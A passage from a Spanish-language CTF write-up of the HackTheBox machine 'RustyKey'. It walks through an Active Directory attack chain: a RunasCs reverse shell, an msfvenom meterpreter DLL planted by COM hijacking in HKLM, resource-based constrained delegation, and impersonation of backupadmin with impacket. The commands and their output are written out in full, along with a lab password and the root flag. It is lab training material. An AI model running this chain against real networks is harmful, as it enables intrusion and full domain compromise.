/home/kali/Desktop/rustykey/bloodyAD/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ee.reed.ccache
```

Veremos que si nos deja, rapidamente vamos a descargarnos la herramienta `RunasCs.exe` para poder obtener una `shell` como dicho usuario.

URL = [Download RunasCs.exe ZIP GitHub](https://github.com/antonioCoco/RunasCs/releases)

Una vez descargado el `.zip` del `RunasCs` vamos a descomprimirlo.

```shell
unzip RunasCs.zip
```

Info:

```
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe
```

Ahora desde la `shell` vamos a descargarnos el `RunasCs.exe` llendo al directorio `Downloads` de nuestra carpeta de usuario para que podamos utilizarlo.

```powershell
cd C:/Users/bb.morgan/Downloads/
upload RunasCs.exe
```

Info:

```
Info: Uploading /home/kali/Desktop/rustykey/bloodyAD/RunasCs.exe to C:\Users\bb.morgan\Downloads\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```

Ahora si desde una `shell` de `Windows` poniendo `shell` en el `meterpreter`...

Pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos este comando...

```powershell
.\RunasCs.exe ee.reed 'P@ssw0rd!' powershell.exe -r <IP>:<PORT>
```

Info:

```
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-20b7ac4$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 8460 created in background.
```

Ahora si volvemos a donde tenemos la escucha:

```
listening on [any] 7777 ...
connect to [10.10.14.79] from (UNKNOWN) [10.10.11.75] 60836
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
rustykey\ee.reed
```

Veremos que ha funcionado, por lo que seremos dicho usuario.

## Escalate user MM.TURNER

Ahora siendo dicho usuario recordemos que estamos en el grupo `SUPPORT` el cual puede modificar el registro y funciones relacionadas con la compresión/descompresión.

### COM Hijacking

Vamos a Identificar `COM objects` usados por aplicaciones privilegiadas de esta forma:

```powershell
Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InprocServer32" -Name "(default)"
```

Info:

```
(default)    : C:\Windows\system32\zipfldr.dll
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\Inpro
               cServer32
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}
PSChildName  : InprocServer32
PSProvider   : Microsoft.PowerShell.Core\Registry
```

El `CLSID` `{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}` corresponde a **zipfldr.dll** (Compressed Folders Handler). Este se ejecuta cuando se abren archivos ZIP en el Explorador de Windows.

Vamos a generar un `payload` malicioso que sea una `.dll` con `msfvenom` para poder aprovechar este `Hijacking 7-Zip`.

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f dll -o 7zhack.dll
```

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: 7zhack.dll
```

Una vez generado nuestro `payload` vamos a pasarnoslo a la maquina atacante, recordemos que teniamos una `shell` con el usuario `a` por `evil-winrm` por lo que vamos a utilizarla para desplazarnos a la carpeta `Temp` y subir el archivo asi:

```powershell
C:\Windows\Temp
upload 7zhack.dll
```

Info:

```
Info: Uploading /home/kali/Desktop/rustykey/bloodyAD/7zhack.dll to C:\Windows\Temp\7zhack.dll
                                        
Data: 12288 bytes of 12288 bytes copied
                                        
Info: Upload successful!
```

Ahora desde el usuario `ee.reed` vamos a desplazarnos a dicha carpeta y utilizar ese `payload` de esta forma:

Pero antes nos pondremos a la escucha con `metasploit` para obtener le `meterpreter`.

```shell
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT <PORT>
run
```

Info:

```
[*] Started reverse TCP handler on 10.10.14.79:7755
```

Ahora estando a la escucha vamos a ejecutar la tecnica de `COM Hijacking` con el `7zhack.dll` de nuestro `payload` para obtener la `shell`.

> NOTA: Estamos intentando hacerlo en un `HKLM` (Local Machine). Esto lo hacemos por que sabemos que el usuario `SUPPORT` tiene escritura privilegiada en el `HKLM`.

```powershell
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Windows\Temp\7zhack.dll" /f
```

Info:

```
The operation completed successfully.
```

Veremos que ha funcionado y si esperamos un rato veremos lo siguiente en nuestra escucha:

```
[*] Started reverse TCP handler on 10.10.14.79:7755 
[*] Sending stage (203846 bytes) to 10.10.11.75
[*] Meterpreter session 1 opened (10.10.14.79:7755 -> 10.10.11.75:60955) at 2025-10-15 12:57:58 -0700

meterpreter > getuid
Server username: RUSTYKEY\mm.turner
```

Vemos que hemos obtenido acceso con el usuario `mm.turner`.

## Escalate Privileges

Si nos vamos a nuestro `BloodHound` a ver los privilegios que tiene dicho usuario...

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-15 140506.png" alt=""><figcaption></figcaption></figure>

Vemos que somos del grupo `DELEGATIONMANAGER` y que este a su vez tiene los privilegios de `AddAllowedToAct` sobre el `DC` del dominio entero, por lo que podremos escalar privilegios maximos con esta vulnerabilidad de esta forma:

Primero vamos hacer que `IT-COMPUTER3` puede obtener `tickets de servicio` para **cualquier servicio** en el `DC`. Esto lo hacemos mediante **Resource-Based Constrained Delegation (RBCD)**

```powershell
shell
powershell.exe
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```

Ahora vamos con dicho usuario exportarnos la variable del `TGT` de nuevo y ya que podemos obtener un `TGS` de cualquier servicio del `DC`, obtendremos el del `backupadmin` que es el que nos interesa.

```shell
ntpdate rustykey.htb ; impacket-getST -dc-ip dc.rustykey.htb -spn cifs/dc.rustykey.htb -impersonate backupadmin -k rustykey.htb/IT-COMPUTER3$:'Rusty88!'
```

Info:

```
2025-10-15 13:55:01.774017 (-0700) +7.873133 +/- 0.015349 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 7.873133
/home/kali/Desktop/rustykey/bloodyAD/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache
```

Ahora vamos acceder por `WinRM` mediante este `TGS` obtenido de esta forma:

```shell
export KRB5CCNAME=backupadmin@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache
impacket-wmiexec -k -no-pass rustykey.htb/backupadmin@dc.rustykey.htb
```

Info:

```
/home/kali/Desktop/rustykey/bloodyAD/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rustykey\backupadmin
```

Veremos que ha funcionado, por lo que ya seremos `administradores` directamente, vamos a leer la `flag` del `admin`.

> root.txt

```
efc86097c45744b15a656a1e51cbf774
```
